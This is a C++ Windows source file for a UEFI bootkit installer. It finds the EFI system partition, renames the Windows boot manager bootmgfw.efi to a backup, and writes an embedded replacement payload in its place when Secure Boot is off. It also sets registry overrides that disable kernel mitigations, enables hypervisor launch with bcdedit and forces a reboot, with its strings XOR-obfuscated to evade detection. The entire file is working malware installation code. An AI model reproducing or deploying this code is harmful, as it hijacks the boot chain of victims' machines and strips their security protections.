#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <winioctl.h>
#include <iostream>
#include <initguid.h>
#include <cfgmgr32.h>
#include <devguid.h>
#include <devpkey.h>
#include <diskguid.h>
#include <winternl.h>
#include <fstream>
#include <intrin.h>
#include "Xor.h"
#include "LoaderEfi.h"
#include "ShellCode.h"
#include <filesystem>
#include "XorString.hpp"

#pragma comment(lib, "ntdll.lib")

#define SIZEOF_ARRAY(_Array)     (sizeof(_Array)/sizeof(_Array[0]))

ULONG GetCPUVendor()
{
	CPUID data = {};
	char vendor[0x20] = {};
	__cpuid((int*)&data, 0);
	*(int*)(vendor) = data.ebx;
	*(int*)(vendor + 4) = data.edx;
	*(int*)(vendor + 8) = data.ecx;

	if (memcmp(vendor, CRY_XORSTR_LIGHT("GenuineIntel"), 12) == 0)
		return 1;
	if (memcmp(vendor, CRY_XORSTR_LIGHT("AuthenticAMD"), 12) == 0)
		return 2;

	return 0;
}

bool IsHypervisorPresent(const char* HyperVisorName)
{
	int registers[4] = {};
	char vendorId[13] = {};
	__cpuid(registers, 0x40000000);
	RtlCopyMemory(vendorId + 0, &registers[1], sizeof(registers[1]));
	RtlCopyMemory(vendorId + 4, &registers[2], sizeof(registers[2]));
	RtlCopyMemory(vendorId + 8, &registers[3], sizeof(registers[3]));
	vendorId[12] = ANSI_NULL;
	return (strcmp(vendorId, HyperVisorName) == 0);
}

bool CreateAndWriteValue(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD Type, ULONG Value)
{
	HKEY DefKey{};
	RegCreateKeyExW(hKey, lpSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &DefKey, NULL);
	if (RegSetValueExW(DefKey, lpValueName, 0, Type, (LPBYTE)&Value, sizeof(DWORD)) != ERROR_SUCCESS)
		return false;

	return true;
}

bool BypassKva()
{
	HKEY Key{};
	ULONG Type = REG_DWORD;
	ULONG vFeatureSettingsOverride = 0;
	ULONG vFeatureSettingsOverrideMask = 0;
	ULONG vValueLeght = 4;
	if (RegOpenKeyW(HKEY_LOCAL_MACHINE, CRY_XORSTR_LIGHT_W(L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management"), &Key) != ERROR_SUCCESS)
		return false;

	if (RegQueryValueExW(Key, CRY_XORSTR_LIGHT_W(L"FeatureSettingsOverride"), NULL, &Type, (LPBYTE)&vFeatureSettingsOverride, &vValueLeght) == ERROR_FILE_NOT_FOUND)
	{
		CreateAndWriteValue(HKEY_LOCAL_MACHINE, CRY_XORSTR_LIGHT_W(L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management"), CRY_XORSTR_LIGHT_W(L"FeatureSettingsOverride"), REG_DWORD, 3);
	}

	printf(CRY_XORSTR_LIGHT("[*] FeatureSettingsOverride: %u\n"), vFeatureSettingsOverride);

	if (vFeatureSettingsOverride != 3)
	{
		vFeatureSettingsOverride = 3;
		RegSetValueExW(Key, CRY_XORSTR_LIGHT_W(L"FeatureSettingsOverride"), 0, REG_DWORD, (LPBYTE)&vFeatureSettingsOverride, sizeof(DWORD));
		vFeatureSettingsOverride = 0;
	}

	if (RegQueryValueExW(Key, CRY_XORSTR_LIGHT_W(L"FeatureSettingsOverrideMask"), NULL, &Type, (LPBYTE)&vFeatureSettingsOverrideMask, &vValueLeght) == ERROR_FILE_NOT_FOUND)
	{
		CreateAndWriteValue(HKEY_LOCAL_MACHINE, CRY_XORSTR_LIGHT_W(L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management"), CRY_XORSTR_LIGHT_W(L"FeatureSettingsOverrideMask"), REG_DWORD, 3);
	}

	printf(CRY_XORSTR_LIGHT("[*] FeatureSettingsOverrideMask: %u\n"), vFeatureSettingsOverrideMask);

	if (vFeatureSettingsOverrideMask != 3)
	{
		vFeatureSettingsOverrideMask = 3;
		RegSetValueExW(Key, CRY_XORSTR_LIGHT_W(L"FeatureSettingsOverrideMask"), 0, REG_DWORD, (LPBYTE)&vFeatureSettingsOverrideMask, sizeof(DWORD));
		vFeatureSettingsOverrideMask = 0;
	}
	RegCloseKey(Key);
	return true;
}

bool IsEfiPart(HANDLE hHandle)
{
	if (hHandle == INVALID_HANDLE_VALUE)
		return false;

	DWORD Byte = 0;
	PARTITION_INFORMATION_EX PartInfo{};
	if (!DeviceIoControl(hHandle, IOCTL_DISK_GET_PARTITION_INFO_EX, 0, 0, &PartInfo, sizeof(PartInfo), &Byte, NULL))
		return false;

	switch (PartInfo.PartitionStyle)
	{
	case PARTITION_STYLE_MBR:
		return false;
		break;
	case PARTITION_STYLE_GPT:
		if (IsEqualGUID(PartInfo.Gpt.PartitionType, PARTITION_SYSTEM_GUID))
			return true;

		break;
	}
	return false;
}

HANDLE GetDiskHandle(const wchar_t* Name)
{
	HANDLE handle;
	UNICODE_STRING object_name;
	OBJECT_ATTRIBUTES object_attributes;
	IO_STATUS_BLOCK io_status_block;
	RtlInitUnicodeString(&object_name, const_cast<wchar_t*>(Name));
	InitializeObjectAttributes(&object_attributes, &object_name, OBJ_CASE_INSENSITIVE, NULL, NULL);
	NTSTATUS status = NtOpenFile(&handle, FILE_GENERIC_READ | FILE_GENERIC_WRITE, &object_attributes, &io_status_block, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_NON_DIRECTORY_FILE);
	if (NT_SUCCESS(status))
		return handle;

	return INVALID_HANDLE_VALUE;
}

bool CreateFromMemory(const std::wstring& desired_file_path, const char* address, size_t size)
{
	std::ofstream file_ofstream(desired_file_path.c_str(), std::ios_base::out | std::ios_base::binary);
	if (!file_ofstream.write(address, size))
	{
		file_ofstream.close();
		return false;
	}
	file_ofstream.close();
	return true;
}

bool EditEfiVolume(ULONG DiskNumber)
{
	bool bSuccess = true;
	HANDLE FindHandle = INVALID_HANDLE_VALUE;
	WCHAR  VolumeName[MAX_PATH] = L"";
	WCHAR DeviceName[MAX_PATH] = L"";
	size_t Index = 0;
	DWORD CharCount = 0;
	DWORD Byte = 0;

	FindHandle = FindFirstVolumeW(VolumeName, ARRAYSIZE(VolumeName));
	if (FindHandle == INVALID_HANDLE_VALUE)
	{
		printf(CRY_XORSTR_LIGHT("[-] FindHandle\n"));
		return false;
	}

	while (bSuccess)
	{
		Index = wcslen(VolumeName) - 1;
		if (VolumeName[0] != L'\\' || VolumeName[1] != L'\\' || VolumeName[2] != L'?' || VolumeName[3] != L'\\' || VolumeName[Index] != L'\\')
		{
			printf(CRY_XORSTR_LIGHT("[-] VolumeName\n"));
			return false;
		}

		VolumeName[Index] = L'\0';
		CharCount = QueryDosDeviceW(&VolumeName[4], DeviceName, ARRAYSIZE(DeviceName));
		VolumeName[Index] = L'\\';
		if (CharCount == 0)
		{
			printf(CRY_XORSTR_LIGHT("[-] Count\n"));
			return false;
		}
			
		HANDLE hDevice = GetDiskHandle(DeviceName);
		if (hDevice == INVALID_HANDLE_VALUE)
			continue;

		if (IsEfiPart(hDevice))
		{
			STORAGE_DEVICE_NUMBER DiskNum{};
			if (!DeviceIoControl(hDevice, IOCTL_STORAGE_GET_DEVICE_NUMBER, NULL, 0, &DiskNum, sizeof(STORAGE_DEVICE_NUMBER), &Byte, NULL))
				continue;

			//if (DiskNum.DeviceNumber == DiskNumber)
			{
				if (!DefineDosDeviceW(DDD_RAW_TARGET_PATH, CRY_XORSTR_LIGHT_W(L"\\A:"), DeviceName))
				{
					printf(CRY_XORSTR_LIGHT("[-] TARGET_PATH\n"));
					return false;
				}
			
				if (std::filesystem::exists(CRY_XORSTR_LIGHT("A:\\EFI\\Microsoft\\Boot\\bootmgfw.efi")) && std::filesystem::exists(CRY_XORSTR_LIGHT("A:\\EFI\\Microsoft\\Boot\\bootmgfw.efi.backup"))) //bootmgfw.efi.backup
				{
					printf(CRY_XORSTR_LIGHT("[-] FILE_EXIST\n"));
					return false;
				}			
//rebuild:
//				if (sizeof(UefiData) == std::filesystem::file_size(XorChar("A:\\EFI\\Microsoft\\Boot\\bootmgfw.efi")))
//				{
//					TCHAR windir[MAX_PATH];
//					if (!GetWindowsDirectoryW(windir, MAX_PATH))
//						return false;
//
//					std::wstring CurentPath = windir;
//					if(CurentPath.empty())
//						return false;
//
//					std::wstring BootPath = (CurentPath += XorWchar(L"\\Boot\\EFI\\bootmgfw.efi"));
//					if (!std::filesystem::exists(BootPath))
//					{
//						printf("[-] Error Boot bootmgfw.efi\n");
//						return false;
//					}
//					printf("[*] Boot: %ws\n", BootPath.c_str());
//					if(!std::filesystem::copy_file(BootPath, XorChar("A:\\EFI\\Microsoft\\Boot\\bootmgfw.efi")))
//						return false;
//
//					printf("[*] Boot Rebuild Success!\n");
//					goto rebuild;
//				}

				system(CRY_XORSTR_LIGHT("attrib -s -h A:\\EFI\\Microsoft\\Boot\\bootmgfw.efi"));
				if (rename(CRY_XORSTR_LIGHT("A:\\EFI\\Microsoft\\Boot\\bootmgfw.efi"), CRY_XORSTR_LIGHT("A:\\EFI\\Microsoft\\Boot\\bootmgfw.efi.backup")) == 0)
				{
					if (!CreateFromMemory(CRY_XORSTR_LIGHT_W(L"A:\\EFI\\Microsoft\\Boot\\bootmgfw.efi"), reinterpret_cast<const char*>(UefiData), sizeof(UefiData)))
						return false;

					printf(CRY_XORSTR_LIGHT("[*] EFI Good!\n"));
					CloseHandle(hDevice);
					break;
				}
			}
			//else
			//{
			//	printf(CRY_XORSTR_LIGHT("[*] Warning partition UEFI Incorrectly installed\n"));
			//}
		}
		CloseHandle(hDevice);
		bSuccess = FindNextVolumeW(FindHandle, VolumeName, SIZEOF_ARRAY(VolumeName));
	}
	FindVolumeClose(FindHandle);
	return true;
}

bool CraftUefi(ULONG CupVendor)
{
	DWORD Byte = 0;
	WCHAR fname[32];
	wchar_t* SystemDrive{ 0 };
	FIRMWARE_TYPE Type{};
	if (!GetFirmwareType(&Type))
	{
		printf(CRY_XORSTR_LIGHT("[-] GetFirmwareType\n"));
		return false;
	}
		
	size_t count = 0;
	_wdupenv_s(&SystemDrive, &count, CRY_XORSTR_LIGHT_W(L"SystemDrive"));
	_swprintf(fname, CRY_XORSTR_LIGHT_W(L"\\\\.\\%ws"), SystemDrive);
	free(SystemDrive);

	HANDLE hHandleDisk = CreateFileW(fname, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hHandleDisk == INVALID_HANDLE_VALUE)
	{
		printf(CRY_XORSTR_LIGHT("[-] SystemDrive\n"));
		return false;
	}

	STORAGE_DEVICE_NUMBER DiskNum{};
	if (!DeviceIoControl(hHandleDisk, IOCTL_STORAGE_GET_DEVICE_NUMBER, NULL, 0, &DiskNum, sizeof(STORAGE_DEVICE_NUMBER), &Byte, NULL))
	{
		printf(CRY_XORSTR_LIGHT("[-] STORAGE_DEVICE_NUMBER\n"));
		return false;
	}

	//printf(XorChar("[*] DiskNumber: %d\n"), DiskNum.DeviceNumber);
	CloseHandle(hHandleDisk);

	_swprintf(fname, CRY_XORSTR_LIGHT_W(L"\\\\.\\PhysicalDrive%d"), DiskNum.DeviceNumber);
	HANDLE hDevice = CreateFileW(fname, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);
	if (hDevice == INVALID_HANDLE_VALUE)
		return false;

	PARTITION_INFORMATION_EX Partiton{};
	if (!DeviceIoControl(hDevice, IOCTL_DISK_GET_PARTITION_INFO_EX, NULL, 0, &Partiton, sizeof(PARTITION_INFORMATION_EX), &Byte, NULL))
	{
		printf(CRY_XORSTR_LIGHT("[-] PARTITION_INFORMATION_EX\n"));
		return false;
	}
		
	CloseHandle(hDevice);

	if (Partiton.PartitionStyle == 0)
	{
		printf(CRY_XORSTR_LIGHT("[-] DiskStyle: MBR\n"));
		return false;
	}

	if (Type == 2)
	{
		ULONG dwcbSz = 0UL;
		SYSTEM_SECUREBOOT_INFORMATION Sb = {};
		NTSTATUS status = NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS(0x91), &Sb, sizeof(SYSTEM_SECUREBOOT_INFORMATION), &dwcbSz);
		if (!NT_SUCCESS(status) || dwcbSz != sizeof(SYSTEM_SECUREBOOT_INFORMATION))
		{
			printf(CRY_XORSTR_LIGHT("[-] Error: SystemSecureBootInformation\n"));
			return false;
		}

		if (Sb.SecureBootEnabled == FALSE)
		{
			if (!EditEfiVolume(DiskNum.DeviceNumber))
			{
				printf(CRY_XORSTR_LIGHT("[-] Warning Efi Part\n"));
				return false;
			}

			if (!IsHypervisorPresent(CRY_XORSTR_LIGHT("Microsoft Hv")))
			{
				if (CupVendor == 1)
				{
					BypassKva();
					system(CRY_XORSTR_LIGHT("BCDEDIT /Set {current} hypervisorlaunchtype auto"));
					system(CRY_XORSTR_LIGHT("shutdown /r /t 10"));
				}
				else
				{
					system(CRY_XORSTR_LIGHT("BCDEDIT /Set {current} hypervisorlaunchtype auto"));
					system(CRY_XORSTR_LIGHT("shutdown /r /t 10"));
				}
			}
		}
		else
		{
			printf(CRY_XORSTR_LIGHT("[-] Warning disable Security Boot\n"));
			return false;
		}
	}
	else
	{
		printf(CRY_XORSTR_LIGHT("[-] BIOS does not support UEFI!!\n"));
		return false;
	}
	return true;
}